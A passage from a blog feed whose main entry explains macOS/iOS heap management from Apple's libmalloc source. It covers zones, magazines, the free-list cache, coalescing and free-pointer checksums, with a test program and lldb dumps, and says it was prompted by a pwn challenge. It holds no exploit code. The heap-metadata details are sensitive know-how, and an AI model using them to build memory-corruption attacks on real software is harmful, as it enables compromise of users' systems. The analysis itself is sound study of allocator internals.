    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!" />    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none"></div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>源码解读macOS/iOS Heap</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/01/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3macos-heap/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3macos-heap/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/01/深入理解macos-heap/深入理解macos-heap/</id>
    <published>2019-04-01T07:30:31.000Z</published>
    <updated>2019-04-02T05:50:15.199Z</updated>
    
    <content type="html"><![CDATA[<h3 id="源码解读macOS-iOS-Heap"><a href="#源码解读macOS-iOS-Heap" class="headerlink" title="源码解读macOS/iOS Heap"></a>源码解读macOS/iOS Heap</h3><blockquote><p>关于linux的堆管理已经有很多人写了很多相关的分析，但在mac平台的堆相关的资料却很少。本文由tctf的一道mac平台pwn题目引起，是我对macOS/iOS的堆管理的一些理解，希望有所帮助。</p></blockquote><h4 id="从malloc说起"><a href="#从malloc说起" class="headerlink" title="从malloc说起"></a>从malloc说起</h4><p><code>malloc</code>是我们经常使用的函数，这里也是<code>libmalloc.dylib</code>暴露出来的接口，另外苹果开源了<a href="https://opensource.apple.com/source/libmalloc/" target="_blank" rel="external">libmalloc代码</a>。所以接下来我们就从源码的角度深入下去。</p><pre><code class="c">void *malloc(size_t size){    void *retval;    retval = malloc_zone_malloc(default_zone, size);    if (retval == NULL) {        errno = ENOMEM;    }    return retval;}</code></pre><p>这里实际调用了<code>malloc_zone_malloc</code>函数，传入了<code>default_zone</code>全局变量</p><pre><code class="c">static virtual_default_zone_t virtual_default_zone__attribute__((section(&quot;__DATA,__v_zone&quot;)))__attribute__((aligned(PAGE_MAX_SIZE))) = {    NULL,    NULL,    default_zone_size,    default_zone_malloc,    default_zone_calloc,    default_zone_valloc,    default_zone_free,    default_zone_realloc,    default_zone_destroy,    DEFAULT_MALLOC_ZONE_STRING,    default_zone_batch_malloc,    default_zone_batch_free,    &amp;default_zone_introspect,    10,    default_zone_memalign,    default_zone_free_definite_size,    default_zone_pressure_relief,    default_zone_malloc_claimed_address,};static malloc_zone_t *default_zone = &amp;virtual_default_zone.malloc_zone;</code></pre><p>这里初始化了一个默认的zone，正如名字一样<code>virtual_default_zone</code>其实是一个虚假的zone，接下来是调用<code>malloc_zone_malloc</code></p><pre><code class="c">void *malloc_zone_malloc(malloc_zone_t *zone, size_t size){    MALLOC_TRACE(TRACE_malloc | DBG_FUNC_START, (uintptr_t)zone, size, 0, 0);    void *ptr;    if (malloc_check_start &amp;&amp; (malloc_check_counter++ &gt;= malloc_check_start)) {        internal_check();    }    if (size &gt; MALLOC_ABSOLUTE_MAX_SIZE) {        return NULL;    }    ptr = zone-&gt;malloc(zone, size);        // if lite zone is passed in then we still call the lite methods    if (malloc_logger) {        malloc_logger(MALLOC_LOG_TYPE_ALLOCATE | MALLOC_LOG_TYPE_HAS_ZONE, (uintptr_t)zone, (uintptr_t)size, 0, (uintptr_t)ptr, 0);    }    MALLOC_TRACE(TRACE_malloc | DBG_FUNC_END, (uintptr_t)zone, size, (uintptr_t)ptr, 0);    return ptr;}</code></pre><p>这里调用的<code>ptr = zone-&gt;malloc(zone, size);</code>就是<code>default_zone_malloc</code>函数</p><pre><code class="c">static void *default_zone_malloc(malloc_zone_t *zone, size_t size){    zone = runtime_default_zone();    return zone-&gt;malloc(zone, size);}</code></pre><p>这里的<code>runtime_default_zone()</code>很重要，其实这里才是去真正的初始化zone</p><pre><code class="c">runtime_default_zone   // inline----inline_malloc_default_zone  //inline--------_malloc_initialize_once  //inline ------------_malloc_initialize()</code></pre><p>下面看<code>_malloc_initialize</code>函数，去掉了一些不相干代码</p><pre><code class="c">static void_malloc_initialize(void *context __unused){    MALLOC_LOCK();    unsigned n;    malloc_zone_t *zone = NULL;    ...    zone = create_scalable_zone(0, malloc_debug_flags);    malloc_zone_register_while_locked(zone);    malloc_set_zone_name(zone, DEFAULT_MALLOC_ZONE_STRING);        initial_default_zone = zone;    if (n != 0) { // make the default first, for efficiency        unsigned protect_size = malloc_num_zones_allocated * sizeof(malloc_zone_t *);        malloc_zone_t *hold = malloc_zones[0];        if (hold-&gt;zone_name &amp;&amp; strcmp(hold-&gt;zone_name, DEFAULT_MALLOC_ZONE_STRING) == 0) {            malloc_set_zone_name(hold, NULL);        }        mprotect(malloc_zones, protect_size, PROT_READ | PROT_WRITE);        malloc_zones[0] = malloc_zones[n];        malloc_zones[n] = hold;        mprotect(malloc_zones, protect_size, PROT_READ);    }    ...}</code></pre><p>这里主要看<code>create_scalable_zone</code>函数，所以默认的zone实际上就是scalable zone</p><pre><code class="c">malloc_zone_t *create_scalable_zone(size_t initial_size, unsigned debug_flags) {    return (malloc_zone_t *) create_scalable_szone(initial_size, debug_flags);}szone_t *create_scalable_szone(size_t initial_size, unsigned debug_flags){    szone_t *szone;    /* get memory for the zone. */    szone = mvm_allocate_pages(SZONE_PAGED_SIZE, 0, 0, VM_MEMORY_MALLOC);    if (!szone) {        return NULL;    }    ...    // Query the number of configured processors.    // Uniprocessor case gets just one tiny and one small magazine (whose index is zero). This gives    // the same behavior as the original scalable malloc. MP gets per-CPU magazines    // that scale (way) better.    unsigned int max_mags = mag_max_magazines();    uint32_t num_magazines = (max_mags &gt; 1) ? MIN(max_mags, TINY_MAX_MAGAZINES) : 1;    rack_init(&amp;szone-&gt;tiny_rack, RACK_TYPE_TINY, num_magazines, debug_flags);    rack_init(&amp;szone-&gt;small_rack, RACK_TYPE_SMALL, num_magazines, debug_flags);#if CONFIG_LARGE_CACHE    // madvise(..., MADV_REUSABLE) death-row arrivals above this threshold [~0.1%]    szone-&gt;large_entry_cache_reserve_limit = (size_t)(memsize &gt;&gt; 10);    /* &lt;rdar://problem/6610904&gt; Reset protection when returning a previous large allocation? */    int32_t libSystemVersion = NSVersionOfLinkTimeLibrary(&quot;System&quot;);    if ((-1 != libSystemVersion) &amp;&amp; ((libSystemVersion &gt;&gt; 16) &lt; 112) /* CFSystemVersionSnowLeopard */) {        szone-&gt;large_legacy_reset_mprotect = TRUE;    } else {        szone-&gt;large_legacy_reset_mprotect = FALSE;    }#endif    // Initialize the security token.    szone-&gt;cookie = (uintptr_t)malloc_entropy[0];    szone-&gt;basic_zone.version = 10;    szone-&gt;basic_zone.size = (void *)szone_size;    szone-&gt;basic_zone.malloc = (void *)szone_malloc;    szone-&gt;basic_zone.calloc = (void *)szone_calloc;    szone-&gt;basic_zone.valloc = (void *)szone_valloc;    szone-&gt;basic_zone.free = (void *)szone_free;    szone-&gt;basic_zone.realloc = (void *)szone_realloc;    szone-&gt;basic_zone.destroy = (void *)szone_destroy;    szone-&gt;basic_zone.batch_malloc = (void *)szone_batch_malloc;    szone-&gt;basic_zone.batch_free = (void *)szone_batch_free;    szone-&gt;basic_zone.introspect = (struct malloc_introspection_t *)&amp;szone_introspect;    szone-&gt;basic_zone.memalign = (void *)szone_memalign;    szone-&gt;basic_zone.free_definite_size = (void *)szone_free_definite_size;    szone-&gt;basic_zone.pressure_relief = (void *)szone_pressure_relief;    szone-&gt;basic_zone.claimed_address = (void *)szone_claimed_address;    /* Set to zero once and for all as required by CFAllocator. */    szone-&gt;basic_zone.reserved1 = 0;    /* Set to zero once and for all as required by CFAllocator. */    szone-&gt;basic_zone.reserved2 = 0;    /* Prevent overwriting the function pointers in basic_zone. */    mprotect(szone, sizeof(szone-&gt;basic_zone), PROT_READ);    szone-&gt;debug_flags = debug_flags;    _malloc_lock_init(&amp;szone-&gt;large_szone_lock);    szone-&gt;cpu_id_key = -1UL; // Unused.    CHECK(szone, __PRETTY_FUNCTION__);    return szone;}</code></pre><p>这个函数分配并且初始化了szone，设置了<code>szone_malloc</code>、<code>szone_free</code>等函数</p><p>所以后面在调用<code>malloc</code>和<code>free</code>的时候实际上调用的是<code>szone_malloc</code>、<code>szone_free</code>。<code>szone_malloc</code>的实现涉及到苹果关于堆设计中最重要的部分，这里先不展开讲解。可以看出苹果设计的这种结构很方便扩展，事实上的确如此，不仅是scalable zone，还可以注册WebKit Malloc、GFXMallocZone、QuartzCore。由对应zone的<code>malloc_zone_*</code>进行实际的内存分配工作。</p><p>下面是程序第一次调用malloc的栈帧，可以看出与我们分析的调用顺序一致</p><pre><code class="c"> *  frame #0: 0x00007fff60bd72af libsystem_malloc.dylib`create_scalable_szone    frame #1: 0x00007fff60bd6e71 libsystem_malloc.dylib`_malloc_initialize + 1482    frame #2: 0x00007fff60c0facb libsystem_platform.dylib`_os_once_callout + 18    frame #3: 0x00007fff60bd68a5 libsystem_malloc.dylib`default_zone_malloc + 77    frame #4: 0x00007fff60bd6807 libsystem_malloc.dylib`malloc_zone_malloc + 103    frame #5: 0x00007fff60bd6783 libsystem_malloc.dylib`malloc + 24    frame #6: 0x00007fff60a9831d libsystem_c.dylib`arc4_init + 109    frame #7: 0x00007fff60a98479 libsystem_c.dylib`arc4random_buf + 37    frame #8: 0x00007fff5f94644e libobjc.A.dylib`_read_images + 396    frame #9: 0x00007fff5f945473 libobjc.A.dylib`map_images_nolock + 1197    frame #10: 0x00007fff5f959279 libobjc.A.dylib`map_images + 68    ....</code></pre><h4 id="scalable-zone"><a href="#scalable-zone" class="headerlink" title="scalable zone"></a>scalable zone</h4><p>szone包含两个racks，分别是tiny和small rack</p><table><thead><tr><th>rack</th><th>32位机器</th><th>64位机器</th></tr></thead><tbody><tr><td>tiny</td><td>&lt;= 496B</td><td>&lt;= 1008B</td></tr><tr><td>small</td><td>&lt;= 128KB</td><td>&lt;=128KB</td></tr></tbody></table><p>大于127KB的就由large allocator分配，直接采用分配页大小的方式。这里不详细讨论。</p><ul><li>有几个处理器，rack就有几个magazine</li><li>每个magazine有多个regions，tiny(1MB)、small(8MB)</li><li>每个region被分为quantum，tiny(16B，64520 Q/region)、small(512B，16319 Q/region)</li></ul><p>具体可以从后面结构体中看出来其包含关系。</p><h5 id="malloc-gt-szone-malloc-gt-szone-malloc-should-clear"><a href="#malloc-gt-szone-malloc-gt-szone-malloc-should-clear" class="headerlink" title="malloc-&gt;szone_malloc-&gt;szone_malloc_should_clear"></a>malloc-&gt;szone_malloc-&gt;szone_malloc_should_clear</h5><pre><code class="c">MALLOC_NOINLINE void *szone_malloc_should_clear(szone_t *szone, size_t size, boolean_t cleared_requested){    void *ptr;    msize_t msize;    if (size &lt;= SMALL_THRESHOLD) {        // tiny size: &lt;=1008 bytes (64-bit), &lt;=496 bytes (32-bit)        // think tiny        msize = TINY_MSIZE_FOR_BYTES(size + TINY_QUANTUM - 1);        if (!msize) {            msize = 1;        }        ptr = tiny_malloc_should_clear(&amp;szone-&gt;tiny_rack, msize, cleared_requested);    } else if (size &lt;= szone-&gt;large_threshold) {        // small size: &lt;=15k (iOS), &lt;=64k (large iOS), &lt;=128k (macOS)        // think small        msize = SMALL_MSIZE_FOR_BYTES(size + SMALL_QUANTUM - 1);        if (!msize) {            msize = 1;        }        ptr = small_malloc_should_clear(&amp;szone-&gt;small_rack, msize, cleared_requested);    } else {        // large: all other allocations        size_t num_kernel_pages = round_page_quanta(size) &gt;&gt; vm_page_quanta_shift;        if (num_kernel_pages == 0) { /* Overflowed */            ptr = 0;        } else {            ptr = large_malloc(szone, num_kernel_pages, 0, cleared_requested);        }    }    return ptr;}</code></pre><p>上面可以清楚看出会根据其申请内存大小从tiny、small、large三种方式分配。这里以tiny为例</p><h5 id="tiny-malloc-should-clear"><a href="#tiny-malloc-should-clear" class="headerlink" title="tiny_malloc_should_clear"></a>tiny_malloc_should_clear</h5><pre><code class="c">void *tiny_malloc_should_clear(rack_t *rack, msize_t msize, boolean_t cleared_requested){    void *ptr;    mag_index_t mag_index = tiny_mag_get_thread_index() % rack-&gt;num_magazines;    magazine_t *tiny_mag_ptr = &amp;(rack-&gt;magazines[mag_index]);    MALLOC_TRACE(TRACE_tiny_malloc, (uintptr_t)rack, TINY_BYTES_FOR_MSIZE(msize), (uintptr_t)tiny_mag_ptr, cleared_requested);#if DEBUG_MALLOC    if (DEPOT_MAGAZINE_INDEX == mag_index) {        malloc_zone_error(rack-&gt;debug_flags, true, &quot;malloc called for magazine index -1\n&quot;);        return (NULL);    }    if (!msize) {        malloc_zone_error(rack-&gt;debug_flags, true, &quot;invariant broken (!msize) in allocation (region)\n&quot;);        return (NULL);    }#endif    SZONE_MAGAZINE_PTR_LOCK(tiny_mag_ptr);#if CONFIG_TINY_CACHE    ptr = tiny_mag_ptr-&gt;mag_last_free;    if (tiny_mag_ptr-&gt;mag_last_free_msize == msize) {        // we have a winner        tiny_mag_ptr-&gt;mag_last_free = NULL;        tiny_mag_ptr-&gt;mag_last_free_msize = 0;        tiny_mag_ptr-&gt;mag_last_free_rgn = NULL;        SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);        CHECK(szone, __PRETTY_FUNCTION__);        if (cleared_requested) {            memset(ptr, 0, TINY_BYTES_FOR_MSIZE(msize));        }#if DEBUG_MALLOC        if (LOG(szone, ptr)) {            malloc_report(ASL_LEVEL_INFO, &quot;in tiny_malloc_should_clear(), tiny cache ptr=%p, msize=%d\n&quot;, ptr, msize);        }#endif        return ptr;    }#endif /* CONFIG_TINY_CACHE */    while (1) {        ptr = tiny_malloc_from_free_list(rack, tiny_mag_ptr, mag_index, msize);        if (ptr) {            SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);            CHECK(szone, __PRETTY_FUNCTION__);            if (cleared_requested) {                memset(ptr, 0, TINY_BYTES_FOR_MSIZE(msize));            }            return ptr;        }        if (tiny_get_region_from_depot(rack, tiny_mag_ptr, mag_index, msize)) {            ptr = tiny_malloc_from_free_list(rack, tiny_mag_ptr, mag_index, msize);            if (ptr) {                SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);                CHECK(szone, __PRETTY_FUNCTION__);                if (cleared_requested) {                    memset(ptr, 0, TINY_BYTES_FOR_MSIZE(msize));                }                return ptr;            }        }        // The magazine is exhausted. A new region (heap) must be allocated to satisfy this call to malloc().        // The allocation, an mmap() system call, will be performed outside the magazine spin locks by the first        // thread that suffers the exhaustion. That thread sets &quot;alloc_underway&quot; and enters a critical section.        // Threads arriving here later are excluded from the critical section, yield the CPU, and then retry the        // allocation. After some time the magazine is resupplied, the original thread leaves with its allocation,        // and retry-ing threads succeed in the code just above.        if (!tiny_mag_ptr-&gt;alloc_underway) {            void *fresh_region;            // time to create a new region (do this outside the magazine lock)            tiny_mag_ptr-&gt;alloc_underway = TRUE;            OSMemoryBarrier();            SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);            fresh_region = mvm_allocate_pages_securely(TINY_REGION_SIZE, TINY_BLOCKS_ALIGN, VM_MEMORY_MALLOC_TINY, rack-&gt;debug_flags);            SZONE_MAGAZINE_PTR_LOCK(tiny_mag_ptr);            // DTrace USDT Probe            MAGMALLOC_ALLOCREGION(TINY_SZONE_FROM_RACK(rack), (int)mag_index, fresh_region, TINY_REGION_SIZE);            if (!fresh_region) { // out of memory!                tiny_mag_ptr-&gt;alloc_underway = FALSE;                OSMemoryBarrier();                SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);                return NULL;            }            ptr = tiny_malloc_from_region_no_lock(rack, tiny_mag_ptr, mag_index, msize, fresh_region);            // we don&#39;t clear because this freshly allocated space is pristine            tiny_mag_ptr-&gt;alloc_underway = FALSE;            OSMemoryBarrier();            SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);            CHECK(szone, __PRETTY_FUNCTION__);            return ptr;        } else {            SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);            yield();            SZONE_MAGAZINE_PTR_LOCK(tiny_mag_ptr);        }    }    /* NOTREACHED */}</code></pre><p>这里的<code>if (tiny_mag_ptr-&gt;mag_last_free_msize == msize)</code>是判断申请大小是否和缓存的大小相同，如果相同，则直接把该内存返回给程序。反之则从<code>ptr = tiny_malloc_from_free_list(rack, tiny_mag_ptr, mag_index, msize);</code>free list中去获取刚好大于该大小的free list。这里的free list是按quantum的倍数递增的一个链表。若还是不能满足则去freelist中由合并得到的较大block中去分配。还不能满足则去region剩余部分申请。最后还不满足则申请新的一个region。申请失败则返回NULL。</p><h5 id="free-gt-malloc-zone-free-gt-szone-free"><a href="#free-gt-malloc-zone-free-gt-szone-free" class="headerlink" title="free-&gt;malloc_zone_free-&gt;szone_free"></a>free-&gt;malloc_zone_free-&gt;szone_free</h5><pre><code class="c">voidszone_free(szone_t *szone, void *ptr){    region_t tiny_region;    region_t small_region;#if DEBUG_MALLOC    if (LOG(szone, ptr)) {        malloc_report(ASL_LEVEL_INFO, &quot;in szone_free with %p\n&quot;, ptr);    }#endif    if (!ptr) {        return;    }    /*     * Try to free to a tiny region.     */    if ((uintptr_t)ptr &amp; (TINY_QUANTUM - 1)) {        malloc_zone_error(szone-&gt;debug_flags, true, &quot;Non-aligned pointer %p being freed\n&quot;, ptr);        return;    }    if ((tiny_region = tiny_region_for_ptr_no_lock(&amp;szone-&gt;tiny_rack, ptr)) != NULL) {        if (TINY_INDEX_FOR_PTR(ptr) &gt;= NUM_TINY_BLOCKS) {            malloc_zone_error(szone-&gt;debug_flags, true, &quot;Pointer %p to metadata being freed\n&quot;, ptr);            return;        }        free_tiny(&amp;szone-&gt;tiny_rack, ptr, tiny_region, 0);        return;    }    /*     * Try to free to a small region.     */    if ((uintptr_t)ptr &amp; (SMALL_QUANTUM - 1)) {        malloc_zone_error(szone-&gt;debug_flags, true, &quot;Non-aligned pointer %p being freed (2)\n&quot;, ptr);        return;    }    if ((small_region = small_region_for_ptr_no_lock(&amp;szone-&gt;small_rack, ptr)) != NULL) {        if (SMALL_META_INDEX_FOR_PTR(ptr) &gt;= NUM_SMALL_BLOCKS) {            malloc_zone_error(szone-&gt;debug_flags, true, &quot;Pointer %p to metadata being freed (2)\n&quot;, ptr);            return;        }        free_small(&amp;szone-&gt;small_rack, ptr, small_region, 0);        return;    }    /* check that it&#39;s a legal large allocation */    if ((uintptr_t)ptr &amp; (vm_page_quanta_size - 1)) {        malloc_zone_error(szone-&gt;debug_flags, true, &quot;non-page-aligned, non-allocated pointer %p being freed\n&quot;, ptr);        return;    }    free_large(szone, ptr);}</code></pre><p>同样，free的时候会先判断该内存是否属于tiny，small，large。则选取对应的free函数。这里以tiny为例</p><pre><code class="c">voidfree_tiny(rack_t *rack, void *ptr, region_t tiny_region, size_t known_size){    msize_t msize;    boolean_t is_free;    mag_index_t mag_index = MAGAZINE_INDEX_FOR_TINY_REGION(tiny_region);    magazine_t *tiny_mag_ptr = &amp;(rack-&gt;magazines[mag_index]);    MALLOC_TRACE(TRACE_tiny_free, (uintptr_t)rack, (uintptr_t)ptr, (uintptr_t)tiny_mag_ptr, known_size);    // ptr is known to be in tiny_region    if (known_size) {        msize = TINY_MSIZE_FOR_BYTES(known_size + TINY_QUANTUM - 1);    } else {        msize = get_tiny_meta_header(ptr, &amp;is_free);        if (is_free) {            free_tiny_botch(rack, ptr);            return;        }    }#if DEBUG_MALLOC    if (!msize) {        malloc_report(ASL_LEVEL_ERR, &quot;*** free_tiny() block in use is too large: %p\n&quot;, ptr);        return;    }#endif    SZONE_MAGAZINE_PTR_LOCK(tiny_mag_ptr);#if CONFIG_TINY_CACHE    // Depot does not participate in CONFIG_TINY_CACHE since it can&#39;t be directly malloc()&#39;d    if (DEPOT_MAGAZINE_INDEX != mag_index) {        if (msize &lt; TINY_QUANTUM) {                      // to see if the bits fit in the last 4 bits            void *ptr2 = tiny_mag_ptr-&gt;mag_last_free; // Might be NULL            msize_t msize2 = tiny_mag_ptr-&gt;mag_last_free_msize;            region_t rgn2 = tiny_mag_ptr-&gt;mag_last_free_rgn;            /* check that we don&#39;t already have this pointer in the cache */            if (ptr == ptr2) {                free_tiny_botch(rack, ptr);                return;            }            if ((rack-&gt;debug_flags &amp; MALLOC_DO_SCRIBBLE) &amp;&amp; msize) {                memset(ptr, SCRABBLE_BYTE, TINY_BYTES_FOR_MSIZE(msize));            }            tiny_mag_ptr-&gt;mag_last_free = ptr;            tiny_mag_ptr-&gt;mag_last_free_msize = msize;            tiny_mag_ptr-&gt;mag_last_free_rgn = tiny_region;            if (!ptr2) {                SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);                CHECK(szone, __PRETTY_FUNCTION__);                return;            }            msize = msize2;            ptr = ptr2;            tiny_region = rgn2;        }    }#endif /* CONFIG_TINY_CACHE */    // Now in the time it took to acquire the lock, the region may have migrated    // from one magazine to another. I.e. trailer-&gt;mag_index is volatile.    // In which case the magazine lock we obtained (namely magazines[mag_index].mag_lock)    // is stale. If so, keep on tryin&#39; ...    region_trailer_t *trailer = REGION_TRAILER_FOR_TINY_REGION(tiny_region);    mag_index_t refreshed_index;    while (mag_index != (refreshed_index = trailer-&gt;mag_index)) { // Note assignment        SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);        mag_index = refreshed_index;        tiny_mag_ptr = &amp;(rack-&gt;magazines[mag_index]);        SZONE_MAGAZINE_PTR_LOCK(tiny_mag_ptr);    }    if (tiny_free_no_lock(rack, tiny_mag_ptr, mag_index, tiny_region, ptr, msize)) {        SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);    }    CHECK(szone, __PRETTY_FUNCTION__);}</code></pre><p>free的时候先将该内存缓存到<code>mag_last_free</code>，若之前<code>mag_last_free</code>为NULL，那么该内存暂时不会被free，仅仅是缓存到<code>mag_last_free</code>。反之，则会将<code>mag_last_free</code>之前的内存free。在free的时候会尝试向前向后合并。合并完成后设置其前后chunk指针等metadata后将其放入对应的free list大小之中。这里需要有注意以下几点</p><ul><li>最近free的内存会被缓存，不会立即合并</li><li>在被free的块metadata是被保护的<ul><li>前后指针按16字节大小对齐</li><li>指针前4位为checksum</li></ul></li></ul><p>关于free块checksum计算如下：</p><pre><code class="c">static MALLOC_INLINE uintptr_tfree_list_checksum_ptr(rack_t *rack, void *ptr){    uintptr_t p = (uintptr_t)ptr;    return (p &gt;&gt; NYBBLE) | ((free_list_gen_checksum(p ^ rack-&gt;cookie) &amp; (uintptr_t)0xF) &lt;&lt; ANTI_NYBBLE); // compiles to rotate instruction}</code></pre><p>指针p与cookie异或然后计算checksum后左移到最高字节或上指针p右移4位得到checksumed后的指针。</p><h4 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h4><p>代码如下</p><pre><code class="c">#include &lt;stdio.h&gt;int main(int argc, char *argv[]) {    void *p1,*p2,*p3,*p4;    p1 = malloc(24);    p2 = malloc(24);    p3 = malloc(24);    p4 = malloc(24);    memset(p1,0xaa,24);    memset(p2,0xbb,24);    memset(p3,0xcc,24);    free(p1);    free(p3);    free(p2);    free(p4);}</code></pre><p>free(p1)，直接将p1缓存，所以内存值不变</p><pre><code class="c">(lldb) x/24gx p10x1002001f0: 0xaaaaaaaaaaaaaaaa 0xaaaaaaaaaaaaaaaa0x100200200: 0xaaaaaaaaaaaaaaaa 0x00007fff5f94d99c0x100200210: 0xbbbbbbbbbbbbbbbb 0xbbbbbbbbbbbbbbbb0x100200220: 0xbbbbbbbbbbbbbbbb 0x00000000000000000x100200230: 0xcccccccccccccccc 0xcccccccccccccccc0x100200240: 0xcccccccccccccccc 0x0000000000000000</code></pre><p>free(p3)，p3放入缓存，p1放入大小为32字节的freelist，p1previous指针8字节设为NULL，next指针指向设为下一个free block，紧接着后面为该block大小，2*quantum=32字节</p><pre><code>(lldb) x/24gx p10x1002001f0: 0x0000000000000000 0x10000000100201080x100200200: 0xaaaaaaaaaaaa0002 0x00027fff5f94d99c0x100200210: 0xbbbbbbbbbbbbbbbb 0xbbbbbbbbbbbbbbbb0x100200220: 0xbbbbbbbbbbbbbbbb 0x00000000000000000x100200230: 0xcccccccccccccccc 0xcccccccccccccccc0x100200240: 0xcccccccccccccccc 0x0000000000000000</code></pre><p>free(p2)，p2放入缓存，p3放入大小为32字节的freelist，p3previous指针8字节设为NULL，next指针指向设为下一个p1</p><pre><code>(lldb) x/24gx p10x1002001f0: 0x3000000010020023 0x10000000100201080x100200200: 0xaaaaaaaaaaaa0002 0x00027fff5f94d99c0x100200210: 0xbbbbbbbbbbbbbbbb 0xbbbbbbbbbbbbbbbb0x100200220: 0xbbbbbbbbbbbbbbbb 0x00000000000000000x100200230: 0x0000000000000000 0x200000001002001f0x100200240: 0xcccccccccccc0002 0x00020000000000000x100200250: 0x0000000000000000 0x00000000000000000x100200260: 0x0000000000000029 0x0000000000000000</code></pre><p>free(p4)，p2向前向后合并，合并p1，p3。指向p1，大小为6*quantum=96字节。previous指针8字节设为NULL，next指针指向设为下一个大小为3Q的block</p><pre><code>(lldb) x/24gx p10x1002001f0: 0x0000000000000000 0x50000000100200480x100200200: 0xaaaaaaaaaaaa0006 0x00027fff5f94d99c0x100200210: 0xbbbbbbbbbbbbbbbb 0xbbbbbbbbbbbbbbbb0x100200220: 0xbbbbbbbbbbbbbbbb 0x00000000000000000x100200230: 0x0000000000000000 0x10000000100201080x100200240: 0xcccccccccccc0002 0x00060000000000000x100200250: 0x0000000000000000 0x00000000000000000x100200260: 0x0000000000000029 0x0000000000000000</code></pre><p>上面可以看出previous和next指针前4位都包含checksum。与上面描述的一致。</p><h4 id="libmalloc中一些结构体"><a href="#libmalloc中一些结构体" class="headerlink" title="libmalloc中一些结构体"></a>libmalloc中一些结构体</h4><h5 id="szone-s-magazine-zone-h"><a href="#szone-s-magazine-zone-h" class="headerlink" title="szone_s // magazine_zone.h"></a>szone_s // magazine_zone.h</h5><pre><code class="c">typedef struct szone_s {      // vm_allocate()&#39;d, so page-aligned to begin with.    malloc_zone_t basic_zone; // first page will be given read-only protection    uint8_t pad[PAGE_MAX_SIZE - sizeof(malloc_zone_t)];    unsigned long cpu_id_key; // unused    // remainder of structure is R/W (contains no function pointers)    unsigned debug_flags;    void *log_address;    /* Allocation racks per allocator type. */    struct rack_s tiny_rack;    struct rack_s small_rack;    /* large objects: all the rest */    _malloc_lock_s large_szone_lock MALLOC_CACHE_ALIGN; // One customer at a time for large    unsigned num_large_objects_in_use;    unsigned num_large_entries;    large_entry_t *large_entries; // hashed by location; null entries don&#39;t count    size_t num_bytes_in_large_objects;#if CONFIG_LARGE_CACHE    int large_entry_cache_oldest;    int large_entry_cache_newest;    large_entry_t large_entry_cache[LARGE_ENTRY_CACHE_SIZE]; // &quot;death row&quot; for large malloc/free    boolean_t large_legacy_reset_mprotect;    size_t large_entry_cache_reserve_bytes;    size_t large_entry_cache_reserve_limit;    size_t large_entry_cache_bytes; // total size of death row, bytes#endif    /* flag and limits pertaining to altered malloc behavior for systems with     * large amounts of physical memory */    unsigned is_largemem;    unsigned large_threshold;    unsigned vm_copy_threshold;    /* security cookie */    uintptr_t cookie;    /* The purgeable zone constructed by create_purgeable_zone() would like to hand off tiny and small     * allocations to the default scalable zone. Record the latter as the &quot;helper&quot; zone here. */    struct szone_s *helper_zone;    boolean_t flotsam_enabled;} szone_t;</code></pre><h5 id="malloc-zone-t-malloc-h"><a href="#malloc-zone-t-malloc-h" class="headerlink" title="malloc_zone_t // malloc.h"></a>malloc_zone_t // malloc.h</h5><pre><code class="c">typedef struct _malloc_zone_t {    /* Only zone implementors should depend on the layout of this structure;    Regular callers should use the access functions below */    void    *reserved1;    /* RESERVED FOR CFAllocator DO NOT USE */    void    *reserved2;    /* RESERVED FOR CFAllocator DO NOT USE */    size_t     (* MALLOC_ZONE_FN_PTR(size))(struct _malloc_zone_t *zone, const void *ptr); /* returns the size of a block or 0 if not in this zone; must be fast, especially for negative answers */    void     *(* MALLOC_ZONE_FN_PTR(malloc))(struct _malloc_zone_t *zone, size_t size);    void     *(* MALLOC_ZONE_FN_PTR(calloc))(struct _malloc_zone_t *zone, size_t num_items, size_t size); /* same as malloc, but block returned is set to zero */    void     *(* MALLOC_ZONE_FN_PTR(valloc))(struct _malloc_zone_t *zone, size_t size); /* same as malloc, but block returned is set to zero and is guaranteed to be page aligned */    void     (* MALLOC_ZONE_FN_PTR(free))(struct _malloc_zone_t *zone, void *ptr);    void     *(* MALLOC_ZONE_FN_PTR(realloc))(struct _malloc_zone_t *zone, void *ptr, size_t size);    void     (* MALLOC_ZONE_FN_PTR(destroy))(struct _malloc_zone_t *zone); /* zone is destroyed and all memory reclaimed */g    const char    *zone_name;    /* Optional batch callbacks; these may be NULL */    unsigned    (* MALLOC_ZONE_FN_PTR(batch_malloc))(struct _malloc_zone_t *zone, size_t size, void **results, unsigned num_requested); /* given a size, returns pointers capable of holding that size; returns the number of pointers allocated (maybe 0 or less than num_requested) */    void    (* MALLOC_ZONE_FN_PTR(batch_free))(struct _malloc_zone_t *zone, void **to_be_freed, unsigned num_to_be_freed); /* frees all the pointers in to_be_freed; note that to_be_freed may be overwritten during the process */    struct malloc_introspection_t    * MALLOC_INTROSPECT_TBL_PTR(introspect);    unsigned    version;    /* aligned memory allocation. The callback may be NULL. Present in version &gt;= 5. */    void *(* MALLOC_ZONE_FN_PTR(memalign))(struct _malloc_zone_t *zone, size_t alignment, size_t size);    /* free a pointer known to be in zone and known to have the given size. The callback may 